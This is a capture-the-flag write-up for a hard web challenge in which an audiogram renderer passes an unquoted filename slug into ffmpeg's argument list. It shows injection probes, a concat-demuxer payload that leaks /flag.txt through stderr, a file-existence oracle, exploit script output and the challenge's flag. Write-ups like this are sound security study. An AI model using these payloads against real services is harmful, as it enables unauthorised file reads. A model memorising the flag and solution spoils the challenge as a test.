# Splice — Web (Hard)

**Flag:** `WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}` · 300 pts · H7TEX 2026 on WebVerse
**Target:** `https://ced0f13a-5765-splice-5ba63.mystery-challenges.webverselabs-pro.com` (an Express instance, sitting behind Cloudflare)
**No bundle:** the whole analysis rests on the source the app itself returns (`/studio`, `/public/css/site.css`, the JSON of `/api/render`).

## Challenge

Tapedeck is a podcast hosting service. The Studio takes an audio clip and "renders" it into an audiogram
(a waveform poster) to download. The challenge's hint: *"Have a look at how the render names and produces
the files it hands back."* WebVerse labels the challenge as CMDI. The flag is on the instance, there is
no artifact to open locally.

## Initial Analysis

`/studio` lays out the pipeline's three steps plainly:

```html
<form method="post" action="/studio/upload" enctype="multipart/form-data">
  <input type="file" name="clip" accept="audio/*">
</form>

<p class="sub">The export name is used as the poster filename.</p>
<input id="slugInput" name="slug" value="audiogram">
```

and the JS calling `/api/render`:

```js
fetch('/api/render', {method:'POST', headers:{'Content-Type':'application/json'},
  body: JSON.stringify({slug: ..., theme: ...})})
  .then(...)
  // Note: the API also returns an `errors` field on failure. The Studio
  // does not surface it here.
```

Two takeaways:

1. The export name goes straight into the output's filename.
2. The API has an `errors` field the UI deliberately does not surface → calling the JSON directly will pick up stderr.

Baseline: upload a self-generated 2 second WAV, render with `slug=audiogram`:

```json
{"ok": true, "outputs": [{"file": "audiogram.png", "url": "/m/b9f13764512c81b7/audiogram.png"}], "errors": null}
```

## Approaches Ruled Out

Before settling, the following channels were checked and ruled out (full log in `notes.md`). Probing `slug` with
shell characters:

| slug | response |
| --- | --- |
| `aa;id` | a real file `aa;id.png` gets created |
| `aa$(id)`, `` aa`id` ``, `aa\|id` | all end up verbatim as filenames |
| `x' && id && 'y` | ffmpeg: `Unable to find a suitable output format for 'x''` |

1. `slug` is passed through a shell. Table above: `;`, `$( )`, backtick and `|` all only become characters
   in a filename. There is no shell standing behind it.
2. argv is safely quoted before it reaches ffmpeg. Last row of the table: the payload `x' && id && 'y`
   lets a `'` through to ffmpeg, giving `Unable to find a suitable output format for 'x''`.
3. That one must render an image and then OCR it, or write the target file into the workspace to read it. `errors` carries
   ffmpeg's stderr in full, so the target file's contents come back in the response's own JSON.

## Exploit Chain

**Step 1 - Locating the command splice.** There is no shell, but there is argv:

```
slug = "x -h"
errors: "Unrecognized option 'h.png'.
         Error splitting the argument list: Option not found"
```

`-h.png` appears as its own argv entry, which means the command string is split on whitespace before being handed to
ffmpeg. The filename `slug + ".png"` is not quoted, so every token placed after a space becomes a new ffmpeg argument.

**Step 2 - Choosing the file-read primitive.** With argv injection there are two directions: `-i` to add an input, or
`-f` to change the demuxer. The shortest route is forcing ffmpeg to read the target file with the concat demuxer:

```
slug = "a.png -f concat -i /flag.txt b.png"
```

Concat is a script format, every line must be `file '...'` or `duration n`. The first line of
`/flag.txt` is invalid, and ffmpeg puts that line's content verbatim into the error message:

```
[concat @ 0x6145f8caea80] Line 1: unknown keyword 'WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}'
/flag.txt: Invalid data found when processing input
```

The server packs all of stderr into `errors`, so the flag comes back in the response, no image render needed, no OCR
needed, no writing files outside the workspace.

**Step 3 - Pinning down the flag path.** The same oracle distinguishes whether a file exists:

```
/flag.txt              -> Line 1: unknown keyword 'WEBVERSE{...}'
/flag                  -> No such file or directory
/opt/app/flag.txt      -> No such file or directory
/app/flag.txt          -> No such file or directory
./flag.txt             -> No such file or directory
```

**Step 4 - Verifying the result does not depend on state.** `exploit.py` opens a fresh session itself (the
`td_session` cookie spawns its own workspace), uploads a WAV built by the `wave` module, then renders exactly
once. This run's workspace is `0d6a6fc0562fc2eb`, a different workspace from the one used while probing
(`b9f13764512c81b7`), and it still yields the same string. The flag is captured by regex over the bytes actually
received and written into `flag.txt`.

## Flag
```bash
python exploit.py https://ced0f13a-5765-splice-5ba63.mystery-challenges.webverselabs-pro.com
```

```
[*] session: td_session=s%3Af9iYs9oShh5WGUU6amVzf3gfG...
[*] upload -> HTTP 200
[*] render -> HTTP 200
[+] WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}
```

```
WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}
```

Submit in the SUBMIT FLAG block on the challenge's WebVerse page
(`/e/YfQq-BkjAX1I9bECP5U9xcsY/c/28`); the solve syncs back to H7TEX by email, checked every
~60 seconds.
